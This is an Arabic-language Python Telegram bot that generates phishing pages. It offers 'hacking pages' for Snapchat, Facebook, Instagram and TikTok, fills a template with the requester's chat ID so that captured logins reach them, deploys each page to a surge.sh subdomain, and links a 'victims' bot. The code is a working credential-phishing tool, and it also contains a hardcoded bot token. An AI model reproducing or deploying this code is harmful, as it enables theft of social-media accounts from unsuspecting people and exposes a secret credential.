import os
import subprocess
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# إعداد التسجيل
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ملف لحفظ الروابط
LINKS_FILE = "user_links.txt"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("موافق", callback_data='agree')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text('اتمنى ان تستخدم هذا فى أمر أخلاقي', reply_markup=reply_markup)

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == 'agree':
        await show_options(query)

async def show_options(query):
    keyboard = [
        [InlineKeyboardButton("SNAPCHAT", callback_data='snap'),
         InlineKeyboardButton("FACEBOOK", callback_data='facebook')],
        [InlineKeyboardButton("INSTAGRAM", callback_data='instagram'),
         InlineKeyboardButton("TIK TOK", callback_data='tiktok')],
        [InlineKeyboardButton("الضحايا", url='https://t.me/algeria_213_bot')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text('صفحات الاختراق', reply_markup=reply_markup)

async def handle_snap(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await handle_request(update.callback_query, 'snapchat')

async def handle_facebook(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await handle_request(update.callback_query, 'facbook')

async def handle_instagram(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await handle_request(update.callback_query, 'insta')

async def handle_tiktok(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await handle_request(update.callback_query, 'tiktok')

async def handle_request(query, platform):
    chat_id = query.from_user.id
    user_folder = os.path.join(os.getcwd(), f'{platform}-{chat_id}')
    os.makedirs(user_folder, exist_ok=True)

    file_path = os.path.join(platform, 'index.html')
    user_file_path = os.path.join(user_folder, 'index.html')

    link_entry = f"{platform.capitalize()}:{chat_id}\n"

    # تحقق من وجود الرابط مسبقًا
    if os.path.exists(LINKS_FILE) and link_entry in open(LINKS_FILE).readlines():
        await query.message.reply_text(f"لقد قمت بإنشاء صفحة {platform.capitalize()} بالفعل.\nرابطك: https://{platform}-{chat_id}.surge.sh")
        return

    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            content = file.read()

        updated_content = content.replace('imad27', str(chat_id))
        with open(user_file_path, 'w', encoding='utf-8') as file:
            file.write(updated_content)

        surge_domain = f"{platform}-{chat_id}.surge.sh"
        surge_command = f"surge {user_folder} --domain {surge_domain}"
        subprocess.run(surge_command, shell=True, check=True)

        # حفظ الرابط في الملف
        with open(LINKS_FILE, 'a') as link_file:
            link_file.write(link_entry)

        link = f"https://{surge_domain}"
        await query.message.reply_text(f"تم تعديل صفحة {platform.capitalize()} ورابطها: {link}")
    except Exception as e:
        logger.error(f"Error in handle_{platform}: {e}")
        await query.message.reply_text(f"فشل تعديل صفحة {platform.capitalize()}.")

    await show_options(query)

async def show_pages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.from_user.id
    pages = []
    
    # ابحث عن الصفحات التي أنشأها المستخدم
    if os.path.exists(LINKS_FILE):
        with open(LINKS_FILE, 'r') as link_file:
            for line in link_file:
                if str(chat_id) in line:
                    platform = line.split(':')[0].strip()
                    link = f"https://{platform.lower()}-{chat_id}.surge.sh"
                    pages.append((platform, link))

    if not pages:
        await update.message.reply_text("لا توجد صفحات تم إنشاؤها بعد.")
        return

    # إنشاء رسالة تضم روابط الصفحات
    message = "روابط صفحاتك:\n"
    keyboard = []
    
    for platform_name, link in pages:
        keyboard.append([InlineKeyboardButton(platform_name, url=link)])

    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup)

def main():
    application = Application.builder().token("7428814157:AAE_cpFTNAeOskpX5x066ht6dqlgdjP7xPo").build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button, pattern='agree'))
    application.add_handler(CallbackQueryHandler(handle_snap, pattern='snap'))
    application.add_handler(CallbackQueryHandler(handle_facebook, pattern='facebook'))
    application.add_handler(CallbackQueryHandler(handle_instagram, pattern='instagram'))
    application.add_handler(CallbackQueryHandler(handle_tiktok, pattern='tiktok'))
    application.add_handler(CommandHandler("page", show_pages))

    application.run_polling()

if __name__ == '__main__':
    main()
